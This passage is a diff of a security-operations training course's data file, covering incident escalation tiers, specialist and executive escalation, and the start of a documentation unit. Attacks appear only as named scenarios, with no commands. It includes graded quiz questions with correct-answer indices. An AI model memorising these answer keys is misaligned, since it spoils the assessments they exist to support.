+          "explanation": "MTTR stands for Mean Time to Respond (or Remediate), measuring how quickly the team neutralizes confirmed threats."
         },
         {
-          id: 'u5-q4',
-          question: 'If an alert has High Impact potential (e.g. Domain Controller target) but Low Detection Confidence (e.g. single noisy heuristic), what is the appropriate action?',
-          options: [
-            'Ignore it because confidence is low',
-            'Investigate urgently with High priority to quickly prove or disprove the threat',
-            'Immediately wipe and re-image the Domain Controller without checking logs',
-            'Delete the detection rule from the SIEM',
+          "id": "u5-q4",
+          "question": "If an alert fires on a Tier 0 Crown Jewel server, but the telemetry is heuristic with low confidence, what should the analyst do?",
+          "options": [
+            "Immediately wipe the server without checking",
+            "Ignore it because confidence is low",
+            "Triage with urgency: quickly verify corroborating telemetry before executing disruptive containment",
+            "Wait 48 hours for more alerts to accumulate"
           ],
-          correctAnswer: 1,
-          explanation: 'High potential impact demands rapid verification even when initial confidence is uncorroborated.',
-        },
-        {
-          id: 'u5-q5',
-          question: 'What is the organizational danger of classifying too many routine alerts as Critical (P1)?',
-          options: [
-            'The internet will shut down',
-            'Alert fatigue and operational exhaustion, leading to real catastrophic breaches being missed',
-            'Hard drives will fill up with ink',
-            'The SIEM vendor will cancel the license',
-          ],
-          correctAnswer: 1,
-          explanation: 'Excessive P1 declarations burn out analysts and desensitize the organization to genuine emergencies.',
-        },
-      ],
-    },
+          "correctAnswer": 2,
+          "explanation": "High impact demands urgent attention, but low confidence requires fast verification before taking disruptive actions on production systems."
+        }
+      ]
+    }
   },
-
-  // =========================================================================
-  // UNIT 6: ESCALATION
-  // =========================================================================
   {
-    id: 'unit-6',
-    unitNumber: 6,
-    title: 'Unit 6: Escalation',
-    description: 'Understand the multi-tier escalation funnel (L1 → L2 → L3), specialist routing (Intel, DFIR, IAM), executive crisis escalation, and warm handoffs.',
-    estimatedHours: 2,
-    topics: [
+    "id": "unit-6",
+    "unitNumber": 6,
+    "title": "Unit 6: Escalation",
+    "description": "Execute seamless incident escalation: tier-to-tier handoffs (L1 → L2, L2 → L3), specialist team engagement, executive crisis communications, and warm transfers.",
+    "estimatedHours": 0.33,
+    "topics": [
       {
-        id: 'topic-6-1',
-        unitId: 'unit-6',
-        title: 'Tier Escalation: The L1 → L2 → L3 Funnel',
-        order: 1,
-        estimatedMinutes: 20,
-        xpReward: 50,
-        theory: {
-          summaryLines: [
-            'Security operations functions as a triage funnel: 90% of alerts are resolved at Tier 1; 8% require Tier 2 investigation; 2% escalate to Tier 3 crisis response.',
-            'L1 (Frontline Triage): Validates alerts within 15-30 minutes, filters false alarms, collects basic telemetry, and escalates true threats.',
-            'L2 (Incident Responder): Conducts deep forensic analysis, reverse engineers artifacts, isolates infected endpoints, and establishes root-cause timelines.',
-            'L3 (Threat Hunter / CSIRT Lead): Handles advanced adversary dwell time, proactive threat hunting, custom exploit analysis, and major incident command.',
-            'The Warm Handoff Rule: Escalations must include written findings, tagged artifacts, and verbal/chat confirmation that the next tier has accepted ownership.',
+        "id": "topic-6-1",
+        "unitId": "unit-6",
+        "title": "Chapter 1: Tiered Escalation: L1 → L2 and L2 → L3",
+        "order": 1,
+        "estimatedMinutes": 10,
+        "xpReward": 50,
+        "theory": {
+          "summaryLines": [
+            "Escalation is the formal transfer of an investigation from an analyst to higher-tier specialists when the scope exceeds playbook procedures.",
+            "L1 → L2 Escalation: Tier 1 escalates when an alert is verified as a True Positive, requires host memory forensics, or needs complex lateral movement tracking.",
+            "L2 → L3 Escalation: Tier 2 escalates to Tier 3 when custom malware reverse-engineering, kernel-level rootkit analysis, or threat hunting across enterprise logs is required.",
+            "A cold handoff (simply reassigning the ticket without notes) creates confusion and delays response.",
+            "A warm handoff requires direct communication: concise summary of findings, verified IOCs, actions taken, and recommended next steps."
           ],
-          knowMore: {
-            title: 'CREST Certified Incident Handler Framework',
-            description: 'International standards for tiered incident handling and response handoffs.',
-            externalUrl: 'https://www.crest-approved.org/',
-            externalLabel: 'Explore CREST IR Standards',
-          },
+          "knowMore": {
+            "title": "CREST: Incident Response Maturity and Handover Procedures",
+            "description": "Learn industry best practices for escalation workflows, analyst briefing protocols, and multi-tier incident handling.",
+            "externalUrl": "https://www.crest-approved.org/",
+            "externalLabel": "CREST IR Standards"
+          }
         },
-        demo: {
-          title: 'The Multi-Tier Escalation Funnel',
-          subtitle: 'Tracing an alert as it transitions smoothly from frontline triage to specialized deep forensics.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'L1: Initial Detection & Validation',
-              description: 'L1 analyst reviews alert #ALT-881, confirms malicious base64 PowerShell, applies initial host isolation tag, and initiates warm handoff.',
-              visualType: 'dashboard',
-              highlightElements: ['l1-validation', 'warm-handoff'],
-              narration: 'L1 completes initial triage and packages all evidence for L2.',
-            },
-            {
-              stepNumber: 2,
-              title: 'L2: Deep Host Forensics',
-              description: 'L2 pulls memory dump, identifies injected DLL in LSASS, and determines that lateral movement was attempted to the backup server.',
-              visualType: 'terminal',
-              highlightElements: ['l2-forensics', 'lateral-movement-found'],
-              narration: 'L2 establishes the blast radius and directs enterprise containment.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] Passing the Investigation Forward",
+                  "subtitle": "Watch an L1 analyst package findings, evidence, and timeline for a seamless escalation to Tier 2",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. L1 Validates True Positive",
+                                      "iconName": "analyst",
+                                      "title": "Initial Triage Completed",
+                                      "description": "L1 analyst validates that failed logins on FIN-PC-04 were followed by an unauthorized remote PowerShell shell.",
+                                      "telemetrySnippet": "L1 TRIAGE COMPLETE: Validated True Positive | Host FIN-PC-04 | User Finance01 | Issue: Remote Shell",
+                                      "highlightText": "Escalation begins only after L1 has qualified the alert and gathered the foundational facts."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Package Essential Artifacts",
+                                      "iconName": "siem",
+                                      "title": "User, Host, IP, and Timeline Assembled",
+                                      "description": "L1 compiles affected User (Finance01), Host (FIN-PC-04), Source IP (10.10.20.15), and exact chronological event log.",
+                                      "telemetrySnippet": "PACKAGE: User=Finance01 | Host=FIN-PC-04 | IP=10.10.20.15 | Timeline=10:31:40 - 10:33:10",
+                                      "highlightText": "A complete escalation package gives Tier 2 all necessary context without duplicate triage."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. Articulate Findings & Reason",
+                                      "iconName": "server",
+                                      "title": "Clear Escalation Justification",
+                                      "description": "L1 writes: 'Interactive shell opened from unauthorized internal IP; requires deep memory forensics and host isolation.'",
+                                      "telemetrySnippet": "REASON FOR ESCALATION: Potential lateral movement; L2 memory capture and network isolation required.",
+                                      "highlightText": "Always state clearly WHY the incident is being escalated and what actions are recommended."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Tier 2 Warm Transfer",
+                                      "iconName": "endpoint",
+                                      "title": "Seamless Handoff to Incident Responder",
+                                      "description": "Case is routed directly into the Tier 2 queue with all artifacts attached, triggering responder notification.",
+                                      "telemetrySnippet": "TRANSFER: Case #2026-104 assigned to L2 On-Call | SLA: 15m Response | Handshake: Complete",
+                                      "highlightText": "Warm handoffs ensure continuity so response actions begin immediately."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Tier 2 Takes Immediate Action",
+                                      "iconName": "analyst",
+                                      "title": "Containment Begins Without Delay",
+                                      "description": "L2 opens the ticket, reviews L1's timeline, and immediately triggers EDR host isolation on FIN-PC-04.",
+                                      "telemetrySnippet": "L2 ACTION: Workstation FIN-PC-04 isolated from network | Memory dump initiated",
+                                      "highlightText": "Thorough L1 documentation enables instantaneous Tier 2 containment."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'Tier Escalation Funnel Simulator',
-          scenario: 'Evaluate 3 incoming incident tickets and assign each to the correct operational tier (L1, L2, or L3).',
-          cards: [
-            {
-              id: 'card-esc1',
-              title: 'Scenario 1: Mass Failed Password Queue',
-              source: 'VPN Gateway Log',
-              timestamp: '12:00:00 UTC',
-              category: 'network',
-              summary: '2,500 failed login attempts from external proxy IP targeting single dormant account.',
-              details: [
-                { label: 'Required Action', value: 'Check if password was guessed; apply perimeter IP block' },
-                { label: 'Assigned Tier', value: 'Tier 1 (L1) - Frontline Queue Triage' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 70,
-              tags: ['L1', 'Queue', 'Triage'],
-            },
-            {
-              id: 'card-esc2',
-              title: 'Scenario 2: Memory Injection & Persistence',
-              source: 'EDR Telemetry on Workstation',
-              timestamp: '12:15:30 UTC',
-              category: 'host',
-              summary: 'Cobalt Strike Beacon injected into `svchost.exe`. Scheduled task created for daily persistence.',
-              details: [
-                { label: 'Required Action', value: 'Perform live memory forensics, isolate host, reverse engineer payload' },
-                { label: 'Assigned Tier', value: 'Tier 2 (L2) - Incident Investigation' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 95,
-              tags: ['L2', 'Forensics', 'Containment'],
-            },
-            {
-              id: 'card-esc3',
-              title: 'Scenario 3: Nation-State Zero-Day Across Domain',
-              source: 'Active Directory Telemetry',
-              timestamp: '12:30:00 UTC',
-              category: 'user',
-              summary: 'Unknown zero-day exploiting Kerberos protocol; Kerberos Golden Ticket forged across entire forest.',
-              details: [
-                { label: 'Required Action', value: 'Enterprise identity reset, emergency war room, CSIRT command' },
-                { label: 'Assigned Tier', value: 'Tier 3 (L3) / CSIRT Commander' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 100,
-              tags: ['L3', 'CSIRT', 'Crisis'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] Who Needs This Next?",
+                  "scenario": "Review the current investigation state for three scenarios and route each to L1 (Triage), L2 (Incident Response), or L3 (Threat Hunting).",
+                  "cards": [
+                            {
+                                      "id": "esc-l1",
+                                      "category": "User",
+                                      "label": "New Unvalidated Alert on Marketing PC",
+                                      "summary": "Raw SIEM alert for multiple failed logins on a marketing laptop; no investigation started.",
+                                      "detailedFindings": "Route to: L1 ANALYST (Initial Triage). Needs entity extraction, timeline analysis, and initial qualification.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "esc-l2",
+                                      "category": "Source IP",
+                                      "label": "Validated Unauthorized PowerShell Shell",
+                                      "summary": "L1 validated that a billing workstation spawned an unauthorized remote command shell.",
+                                      "detailedFindings": "Route to: L2 ANALYST (Incident Response). Needs host containment, memory forensics, and eradication.",
+                                      "severityIndicator": "Suspicious"
+                            },
+                            {
+                                      "id": "esc-l3",
+                                      "category": "Event ID",
+                                      "label": "Suspected Zero-Day Undocumented Binary",
+                                      "summary": "Stealth malware binary discovered with no antivirus signatures and custom encryption routine.",
+                                      "detailedFindings": "Route to: L3 ANALYST (Threat Hunting / Malware Analysis). Needs reverse engineering and fleet-wide hunting.",
+                                      "severityIndicator": "Malicious"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'The Danger of the "Cold Handoff"',
-          scenario: 'An L1 analyst threw a ticket into the L2 queue at 17:00 on Friday without messaging anyone. The L2 team did not notice it until Monday morning, by which time 40 servers were encrypted.',
-          analystMindset: 'Never assume someone saw a ticket. A handoff is only complete when the receiving tier explicitly acknowledges: "I have taken ownership."',
-          bestPractices: [
-            'Always execute a warm handoff: message the incoming tier directly via Slack/Teams or phone.',
-            'Include an executive summary of findings and immediate containment actions taken.',
-            'Verify that ticket state transitions to "Assigned / In Progress" before ending your shift.',
-          ],
+        "socContext": {
+          "title": "Avoiding the \"Dump and Run\" Antipattern",
+          "scenario": "An L1 analyst receives a confusing alert, writes \"looks weird please check\", and reassigns it to L2 without isolating the host or listing IOCs.",
+          "analystMindset": "Your name is on the ticket. Escalating without clear findings forces Tier 2 to start from scratch and wastes critical golden-hour response time.",
+          "bestPractices": [
+            "Always execute immediate containment (e.g. host isolation) before handing off if active malware is confirmed.",
+            "Include exact timestamps, process IDs, and hashes in the handover notes.",
+            "Remain available for 10 minutes after escalation in case Tier 2 has clarifying questions."
+          ]
         },
-        knowledgeCheck: {
-          matching: {
-            title: 'Match Tier to Core Responsibilities',
-            instructions: 'Pair each operational tier with its primary duty.',
-            pairs: [
-              { id: 'tier-1', left: 'Tier 1 (L1) Analyst', right: '24/7 queue triage, false-positive filtering, basic evidence collection' },
-              { id: 'tier-2', left: 'Tier 2 (L2) Responder', right: 'Deep forensic analysis, host containment, and root-cause scoping' },
-              { id: 'tier-3', left: 'Tier 3 (L3) Hunter', right: 'Proactive adversary hunting, zero-day analysis, major incident leadership' },
-              { id: 'tier-4', left: 'SOC Manager', right: 'Metrics reporting, executive communications, shift scheduling, and governance' },
+        "knowledgeCheck": {
+          "matching": {
+            "title": "Match Incident Tasks to Correct SOC Tier",
+            "instructions": "Match each security operations task with the appropriate tier responsible.",
+            "pairs": [
+              {
+                "id": "et1",
+                "left": "Initial alert triage, entity extraction, and host isolation",
+                "right": "Tier 1 (Triage Analyst)"
+              },
+              {
+                "id": "et2",
+                "left": "Deep forensic analysis, lateral movement tracking, and eradication",
+                "right": "Tier 2 (Incident Responder)"
+              },
+              {
+                "id": "et3",
+                "left": "Advanced malware reverse-engineering and threat hunting",
+                "right": "Tier 3 (Threat Hunter / Specialist)"
+              },
+              {
+                "id": "et4",
+                "left": "External crisis communication, regulatory notice, and board briefing",
+                "right": "SOC Manager / CISO"
+              }
             ],
-            explanation: 'Tiered escalation ensures skilled specialists focus on complex investigations while L1 maintains queue velocity.',
-          },
-        },
+            "explanation": "Tier 1 triages and contains; Tier 2 investigates and eradicates; Tier 3 reverses malware and hunts; Leadership manages external crisis communications."
+          }
+        }
       },
       {
-        id: 'topic-6-2',
-        unitId: 'unit-6',
-        title: 'Specialist & Management Escalation',
-        order: 2,
-        estimatedMinutes: 20,
-        xpReward: 50,
-        theory: {
-          summaryLines: [
-            'Security incidents do not live in a technical vacuum; they impact legal, regulatory, and business operations.',
-            'Specialist Escalation: Engaging niche technical teams outside the SOC: Threat Intel (for adversary attribution), Network Engineering (for BGP rerouting), Identity/IAM (for forest-wide password resets).',
-            'Management Escalation: Notifying executive stakeholders: SOC Manager, Chief Information Security Officer (CISO), and Legal Counsel.',
-            'When to escalate to Management: When data breach notification laws (GDPR, SEC, HIPAA) are triggered, ransomware extortion demands are received, or business downtime exceeds SLA limits.',
-            'Public Relations (PR) and Human Resources (HR) are engaged for external communications and insider threat investigations.',
+        "id": "topic-6-2",
+        "unitId": "unit-6",
+        "title": "Chapter 2: Specialist & Management Escalation",
+        "order": 2,
+        "estimatedMinutes": 10,
+        "xpReward": 50,
+        "theory": {
+          "summaryLines": [
+            "Security incidents frequently cross technical boundaries requiring Specialist Escalation to external technical teams.",
+            "Network Engineering: Engaged to apply emergency perimeter firewall blocks, capture packet PCAPs, or reroute BGP traffic.",
+            "IAM / Active Directory Admins: Engaged to revoke Kerberos Golden Tickets (krbtgt reset), reset compromised credentials, or disable federated SSO.",
+            "Management Escalation is mandatory when an incident involves severe financial loss, regulatory reporting deadlines (e.g. GDPR 72-hour notification), or executive data.",
+            "The SOC Lead briefs the CISO and Incident Commander; the CISO handles corporate communications, legal counsel, and law enforcement."
           ],
-          knowMore: {
-            title: 'SANS: Incident Handler Handbook - Executive Communications',
-            description: 'Guidelines on communicating breach impact to C-level executives and board members.',
-            externalUrl: 'https://www.sans.org/',
-            externalLabel: 'Read SANS Incident Management Briefs',
-          },
+          "knowMore": {
+            "title": "ENISA: Good Practice Guide for Incident Management Communications",
+            "description": "Learn European guidelines on crisis communications, cross-functional escalation, and regulatory breach notification procedures.",
+            "externalUrl": "https://www.enisa.europa.eu/",
+            "externalLabel": "ENISA Crisis Communications"
+          }
         },
-        demo: {
-          title: 'The Crisis Escalation Matrix',
-          subtitle: 'Routing non-technical incident impacts to executive stakeholders.',
-          steps: [
-            {
-              stepNumber: 1,
-              title: 'Technical Incident Escalation',
-              description: 'L2 confirms customer database containing 500,000 credit cards was downloaded by external attacker.',
-              visualType: 'terminal',
-              highlightElements: ['data-exfiltration', 'credit-cards'],
-              narration: 'Technical scope confirms a regulatory breach under PCI-DSS and GDPR.',
-            },
-            {
-              stepNumber: 2,
-              title: 'Executive & Legal Mobilization',
-              description: 'The SOC Manager triggers the Crisis Management Plan: Legal Counsel drafts notification, PR prepares statements, and CISO briefs the CEO.',
-              visualType: 'dashboard',
-              highlightElements: ['legal-notification', 'ciso-briefing', 'pr-response'],
-              narration: 'Management handles legal liabilities while technical teams contain the intrusion.',
-            },
-          ],
+        "demo": {
+                  "title": "[Demo] When More People Need to Know",
+                  "subtitle": "Observe how complex security incidents coordinate cross-functional teams and executive leadership",
+                  "steps": [
+                            {
+                                      "id": 1,
+                                      "stage": "1. Cross-Functional Incident",
+                                      "iconName": "analyst",
+                                      "title": "Incident Exceeds SOC Boundaries",
+                                      "description": "Confirmed intrusion involves compromised Active Directory accounts, perimeter firewalls, and cloud databases.",
+                                      "telemetrySnippet": "SCOPE: Active Directory Kerberos compromised | Firewall egress detected | Multiple systems affected",
+                                      "highlightText": "Major incidents require coordination across multiple IT, security, and management teams."
+                            },
+                            {
+                                      "id": 2,
+                                      "stage": "2. Identity & AD Team Escalation",
+                                      "iconName": "server",
+                                      "title": "Engaging Identity Administration",
+                                      "description": "SOC contacts Identity team to revoke compromised Kerberos tickets, force password resets, and lock accounts.",
+                                      "telemetrySnippet": "IDENTITY ENGAGEMENT: Ticket #AD-991 | Revoke KRBTGT | Force reset for Finance01 and Admins",
+                                      "highlightText": "Specialist teams execute domain-level remediation that SOC analysts do not directly manage."
+                            },
+                            {
+                                      "id": 3,
+                                      "stage": "3. Network Engineering Escalation",
+                                      "iconName": "endpoint",
+                                      "title": "Engaging Network Operations",
+                                      "description": "Network team is tasked with implementing emergency perimeter ACL blocks and isolating VLAN switch ports.",
+                                      "telemetrySnippet": "NETWORK ENGAGEMENT: Block external IP 198.51.100.42 at edge firewalls | Quarantine VLAN 20",
+                                      "highlightText": "Network engineers isolate attack vectors and cut off adversary command-and-control channels."
+                            },
+                            {
+                                      "id": 4,
+                                      "stage": "4. Management Escalation",
+                                      "iconName": "siem",
+                                      "title": "Briefing Leadership & Legal Counsel",
+                                      "description": "SOC Manager briefs CISO, corporate legal, and compliance officers regarding potential regulatory reporting requirements.",
+                                      "telemetrySnippet": "EXECUTIVE BRIEFING: Severity: High | Customer Data: Uncompromised | Briefing Delivered to CISO",
+                                      "highlightText": "Executive escalation ensures legal compliance, regulatory reporting, and strategic crisis management."
+                            },
+                            {
+                                      "id": 5,
+                                      "stage": "5. Unified Incident Response",
+                                      "iconName": "attacker",
+                                      "title": "Coordinated Enterprise Defense",
+                                      "description": "All teams operate under unified incident command, ensuring rapid containment while protecting business operations.",
+                                      "telemetrySnippet": "UNIFIED COMMAND: Threat contained across Identity, Network, and Endpoints | Operations Normal",
+                                      "highlightText": "Structured cross-functional collaboration is what successfully resolves enterprise incidents."
+                            }
+                  ]
         },
-        interactive: {
-          title: 'Incident Escalation Router',
-          scenario: 'Review 3 critical incident developments and route each to the appropriate stakeholder (Legal, Threat Intel, Network Engineering, or HR).',
-          cards: [
-            {
-              id: 'card-rout1',
-              title: 'Development 1: Customer Database Leaked on Dark Web',
-              source: 'Breach Notification Trigger',
-              timestamp: '16:00:00 UTC',
-              category: 'user',
-              summary: 'Attacker demands $5M ransom; threatens to publish 200,000 EU customer records in 24 hours.',
-              details: [
-                { label: 'Regulatory Mandate', value: 'GDPR 72-hour breach disclosure requirement' },
-                { label: 'Primary Stakeholder', value: 'General Legal Counsel & CISO' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 100,
-              tags: ['Legal', 'GDPR', 'Extortion'],
-            },
-            {
-              id: 'card-rout2',
-              title: 'Development 2: Rogue Admin Exfiltrating Proprietary Source Code',
-              source: 'DLP Internal Sensor',
-              timestamp: '16:15:00 UTC',
-              category: 'host',
-              summary: 'Departing senior software engineer copying core intellectual property to personal USB drive.',
-              details: [
-                { label: 'Incident Type', value: 'Insider Threat / IP Theft' },
-                { label: 'Primary Stakeholder', value: 'Human Resources (HR) & Corporate Security' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 90,
-              tags: ['HR', 'Insider-Threat', 'DLP'],
-            },
-            {
-              id: 'card-rout3',
-              title: 'Development 3: Nation-State Custom Implant Attribution',
-              source: 'Forensic Lab Sandbox',
-              timestamp: '16:30:00 UTC',
-              category: 'network',
-              summary: 'Obfuscated C2 framework matches proprietary backdoor used exclusively by APT29 (Cozy Bear).',
-              details: [
-                { label: 'Investigation Need', value: 'Strategic campaign attribution & diamond model mapping' },
-                { label: 'Primary Stakeholder', value: 'Cyber Threat Intelligence (CTI) Specialist' },
-              ],
-              isSuspicious: true,
-              relevanceScore: 85,
-              tags: ['Threat-Intel', 'APT29', 'Attribution'],
-            },
-          ],
+        "interactive": {
+                  "title": "[Interactive] Route the Escalation",
+                  "scenario": "Direct each specialized escalation requirement to the appropriate partner team: Identity/AD Team, Network Team, or SOC Management.",
+                  "cards": [
+                            {
+                                      "id": "route-id",
+                                      "category": "User",
+                                      "label": "Domain-Wide Credential Revocation",
+                                      "summary": "Compromised administrative account requires immediate Kerberos ticket reset across domain controllers.",
+                                      "detailedFindings": "Route to: IDENTITY / AD TEAM. Active Directory specialists possess authority to reset forest credentials.",
+                                      "severityIndicator": "Normal"
+                            },
+                            {
+                                      "id": "route-net",
+                                      "category": "Source IP",
+                                      "label": "Perimeter C2 Firewall Block",
+                                      "summary": "Host attempting connections to active adversary C2 IP; requires emergency perimeter firewall ACL block.",
+                                      "detailedFindings": "Route to: NETWORK ENGINEERING. Network team manages perimeter routing and edge firewall configurations.",
+                                      "severityIndicator": "Suspicious"
+                            },
+                            {
+                                      "id": "route-mgmt",
+                                      "category": "Timeline",
+                                      "label": "Regulatory Breach Notification Assessment",
+                                      "summary": "Incident involves potential exposure of customer records requiring legal and compliance evaluation.",
+                                      "detailedFindings": "Route to: SOC MANAGEMENT & LEADERSHIP. Senior leadership and legal counsel manage compliance disclosures.",
+                                      "severityIndicator": "Malicious"
+                            }
+                  ]
         },
-        socContext: {
-          title: 'The Legal Privilege Shield',
-          scenario: 'During a breach investigation, an analyst wrote: "We were totally negligent and left the firewall wide open." This uncorroborated emotional email was subpoenaed in court, costing the company millions.',
-          analystMindset: 'Incident notes are permanent legal documents. Never speculate, never assign blame, and strictly stick to verified facts.',
-          bestPractices: [
-            'Write incident documentation as if it will be read aloud in a courtroom.',
-            'Involve legal counsel early so forensic investigation findings are protected under attorney-client privilege.',
-            'Never speak to news reporters or post about active incidents on social media.',
-          ],
+        "socContext": {
+          "title": "Never Speculate During Executive Escalation",
+          "scenario": "During an executive call, an analyst tells the CEO \"I think the Chinese government stole all our trade secrets,\" without forensic proof.",
+          "analystMindset": "Speak only to confirmed facts. Distinguish clearly between \"What we know\", \"What we suspect\", and \"What we are currently investigating\".",
+          "bestPractices": [
+            "Use standard incident status terminology (Contained, Eradicated, Investigating).",
+            "Avoid technical acronyms when briefing non-technical executive leadership.",
+            "Maintain strict confidentiality—never discuss active breaches on unencrypted personal channels."
+          ]
         },
-        knowledgeCheck: {
-          matching: {
-            title: 'Route the Incident to the Right Specialist',
-            instructions: 'Match each specialized scenario with the correct team to engage.',
-            pairs: [
-              { id: 'spec-1', left: 'Attacker demands cryptocurrency ransom under threat of leaking customer records', right: 'Legal Counsel & Executive Leadership' },
-              { id: 'spec-2', left: 'Mass distributed denial of service (DDoS) overwhelming border routers', right: 'Network Infrastructure Engineering' },
-              { id: 'spec-3', left: 'Departing employee downloading trade secret source code to personal cloud storage', right: 'Human Resources (HR) & Corporate Security' },
-              { id: 'spec-4', left: 'Unknown malware binary requiring disassembly and C2 campaign attribution', right: 'Cyber Threat Intelligence (CTI) Specialist' },
+        "knowledgeCheck": {
+          "matching": {
+            "title": "Match Escalation Needs to External Departments",
+            "instructions": "Match the incident situation on the left with the correct department on the right.",
+            "pairs": [
+              {
+                "id": "me1",
+                "left": "Attacker exfiltrated unencrypted EU customer database",
+                "right": "Legal & Privacy Counsel"
+              },
+              {
+                "id": "me2",
+                "left": "Need emergency BGP null route for C2 IP range on edge routers",
+                "right": "Network Infrastructure Engineering"
+              },
+              {
+                "id": "me3",
+                "left": "Journalists requesting comment on ransomware leak site post",
+                "right": "Public Relations / Media Relations"
+              },
+              {
+                "id": "me4",
+                "left": "Compromised employee suspected of insider sabotage",
+                "right": "Human Resources & Corporate Security"
+              }
             ],
-            explanation: 'Cross-functional alignment ensures technical, legal, and operational containment proceed in parallel.',
-          },
-        },
-      },
+            "explanation": "Cross-functional escalation engages specialists according to legal, infrastructure, public, and personnel requirements."
+          }
+        }
+      }
     ],
-    assessment: {
-      id: 'unit-6-assessment',
-      title: 'Unit 6 Assessment: Escalation',
-      passingScore: 80,
-      xpReward: 150,
-      questions: [
+    "assessment": {
+      "id": "unit-6-assessment",
+      "title": "Unit 6 Assessment: Escalation Procedures",
+      "passingScore": 75,
+      "xpReward": 100,
+      "questions": [
         {
-          id: 'u6-q1',
-          question: 'What is a "warm handoff" in a tiered SOC environment?',
-          options: [
-            'Heating up the server room before an investigation',
-            'Active direct communication and ticket synchronization confirming the recipient has formally accepted ownership',
-            'Closing a ticket without telling anyone to keep metrics high',
-            'Printing the alert on warm laser printer paper',
+          "id": "u6-q1",
+          "question": "What is the primary difference between a \"warm handoff\" and a \"cold handoff\" during incident escalation?",
+          "options": [
+            "A warm handoff occurs during summer months only",
+            "A warm handoff involves direct communication with the incoming team, including a summary of findings, verified IOCs, and actions taken",
+            "A cold handoff requires calling the police",
+            "A warm handoff requires shutting down the server"
           ],
-          correctAnswer: 1,
-          explanation: 'A warm handoff requires direct verbal or written confirmation that the incoming specialist has assumed active ownership.',
+          "correctAnswer": 1,
+          "explanation": "A warm handoff ensures all investigative context, containment actions, and verified IOCs are directly transferred to the receiving responder."
         },
         {
-          id: 'u6-q2',
-          question: 'When should an incident be escalated from the technical SOC to Executive Management and Legal Counsel?',
-          options: [
-            'Whenever an analyst runs out of coffee',
-            'When regulatory reporting mandates (e.g. GDPR, SEC, HIPAA), customer data loss, or extortion threats occur',
-            'Every time a user enters an incorrect password',
-            'Only once per year during annual budgeting reviews',
+          "id": "u6-q2",
+          "question": "When should a Tier 1 analyst escalate an investigation to Tier 2?",
+          "options": [
+            "Whenever an alert has more than 5 lines of text",
+            "When initial triage confirms a True Positive intrusion requiring deep forensics, host memory analysis, or complex containment outside standard playbooks",
+            "Only when the analyst wants to go on lunch",
+            "Never; Tier 1 must solve all incidents alone"
           ],
-          correctAnswer: 1,
-          explanation: 'Executive and legal escalation is triggered when an incident threatens legal liabilities, compliance fines, or public reputation.',
+          "correctAnswer": 1,
+          "explanation": "Tier 1 escalates to Tier 2 when an attack is verified and requires advanced investigation beyond the scope of initial triage playbooks."
         },
         {
-          id: 'u6-q3',
-          question: 'What is the primary role of a Tier 2 (L2) Incident Responder during an escalated intrusion?',
-          options: [
-            'Resetting routine email passwords',
-            'Performing deep host and network forensics, determining blast radius, and guiding host containment',
-            'Negotiating ransom payments with the threat actor',
-            'Writing marketing brochures for the company website',
+          "id": "u6-q3",
+          "question": "If an ongoing breach compromises personal customer records subject to GDPR, what is the mandatory external regulatory reporting deadline?",
+          "options": [
+            "30 days",
+            "72 hours",
+            "6 months",
+            "1 year"
           ],
-          correctAnswer: 1,
-          explanation: 'Tier 2 responders conduct root-cause forensics, memory analysis, and coordinate endpoint containment.',
+          "correctAnswer": 1,
+          "explanation": "Under GDPR Article 33, organizations must notify supervisory authorities within 72 hours of becoming aware of a personal data breach."
         },
         {
-          id: 'u6-q4',
-          question: 'Why should incident notes strictly contain objective, verified facts rather than emotional speculation?',
-          options: [
-            'Because SIEM software cannot store long words',
-            'Because incident tickets are permanent legal and audit records that can be subpoenaed in regulatory reviews or lawsuits',
-            'Because analysts are not allowed to type full sentences',
-            'There is no reason; analysts should write whatever they feel',
+          "id": "u6-q4",
+          "question": "Why must technical analysts avoid speculative statements (e.g. \"We think Russian state actors hacked us\") when briefing executive leadership?",
+          "options": [
+            "It causes technical jargon confusion",
+            "Premature speculation can trigger inappropriate legal disclosures, public panic, or incorrect regulatory filings before forensic evidence confirms attribution",
+            "Executive leaders do not understand politics",
+            "It makes the SIEM slower"
           ],
-          correctAnswer: 1,
-          explanation: 'Careless emotional notes or unverified speculation in tickets can severely damage the organization during legal discovery.',
-        },
-        {
-          id: 'u6-q5',
-          question: 'Which specialized team should be engaged when custom nation-state malware is found and requires campaign attribution and threat actor profiling?',
-          options: [
-            'Facilities & Cafeteria Staff',
-            'Cyber Threat Intelligence (CTI) Specialist',
-            'Social Media Marketing Team',
-            'Billing & Accounts Receivable',
-          ],
-          correctAnswer: 1,
-          explanation: 'Threat Intelligence specialists reverse engineer custom tools, map adversary infrastructure, and provide strategic attribution.',
-        },
-      ],
-    },
+          "correctAnswer": 1,
+          "explanation": "Executive and legal decisions must be grounded in verified forensic evidence, not unconfirmed speculation."
+        }
+      ]
+    }
   },
-
-  // =========================================================================
-  // UNIT 7: SOC DOCUMENTATION
-  // =========================================================================
   {
-    id: 'unit-7',
-    unitNumber: 7,
-    title: 'Unit 7: SOC Documentation',
-    description: 'Master the art of professional security documentation: structuring findings, defanging evidence, recording UTC timelines, and building incident tickets.',
-    estimatedHours: 2.5,
-    topics: [
+    "id": "unit-7",
+    "unitNumber": 7,
+    "title": "Unit 7: SOC Documentation",
+    "description": "Master professional incident documentation: the 5 core pillars (Findings, Evidence, Timeline, Actions, Recommendations), ticketing excellence, and audit readiness.",
+    "estimatedHours": 0.25,
+    "topics": [
       {
-        id: 'topic-7-1',
-        unitId: 'unit-7',
-        title: 'Findings, Evidence & Timeline (UTC Standard)',
-        order: 1,
-        estimatedMinutes: 20,
-        xpReward: 50,
-        theory: {
-          summaryLines: [
-            'If it is not documented, it never happened. High-quality documentation is the hallmark of an elite SOC analyst.',
